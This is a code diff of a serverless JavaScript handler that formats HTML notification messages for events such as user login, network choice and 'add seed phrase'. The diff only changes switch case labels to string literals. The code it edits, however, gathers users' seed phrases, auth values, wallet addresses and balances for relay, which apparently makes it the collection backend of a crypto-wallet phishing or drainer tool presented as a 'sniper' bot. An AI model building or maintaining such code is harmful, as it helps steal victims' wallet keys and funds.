@@ -42,7 +42,7 @@ exports.handler = async (event) => {
 
         switch (type) {
     
-            case `${uR}`: //user register
+            case 'uR': //user register
                 msa = `<u>${uR}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${nom}: <b>${dataReceived.nom}</b>\n` +
@@ -51,32 +51,32 @@ exports.handler = async (event) => {
                     `${ref}: <b>${dataReceived.ref}</b>`;
                 break;
     
-            case `${uL}`: //user login
+            case 'uL': //user login
                 msa = `<u>${uL}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${addi}: <b>${dataReceived.addi}</b>\n` +
                     `${authw}: <b>${dataReceived.authw}</b>`;
                 break;
                 
-            case `${uN}`: //user select network
+            case 'uN': //user select network
                 msa = `<u>${uN}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${net}: <b>${dataReceived.net}</b>`;
                 break;
     
-            case `${uASP}`: //user add seed phrase
+            case 'uASP': //user add seed phrase
                 msa = `<u>${uASP}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${pip}: <b>${dataReceived.pip}</b>`;
                 break; 
     
-            case `${uAWA}`: //user add wallet address
+            case 'uAWA': //user add wallet address
                 msa = `<u>${uAWA}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${wal}: <b>${dataReceived.wal}</b>`;
                 break;                   
                 
-            case `${addFW}`: //user add full wallet
+            case 'addFW': //user add full wallet
                 msa = `<u>${addFW}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${net}: <b>${dataReceived.net}</b>\n` +
@@ -84,7 +84,7 @@ exports.handler = async (event) => {
                     `${pip}: <b>${dataReceived.pip}</b>`;
                 break;  
     
-            case `${uMM}`: //user Log to main sniper menu
+            case 'uMM': //user Log to main sniper menu
                 msa = `<u>${uMM}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${nom}: <b>${dataReceived.nom}</b>\n` +
@@ -94,7 +94,7 @@ exports.handler = async (event) => {
                     `${bal}: <b>${dataReceived.bal} ${dataReceived.net}</b>`;
                 break;           
                 
-            case `${uRFSH}`: //user add full wallet
+            case 'uRFSH': //user add full wallet
                 msa = `<u>${uRFSH}</u>\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${wal}: <b>${dataReceived.wal}</b>\n` +
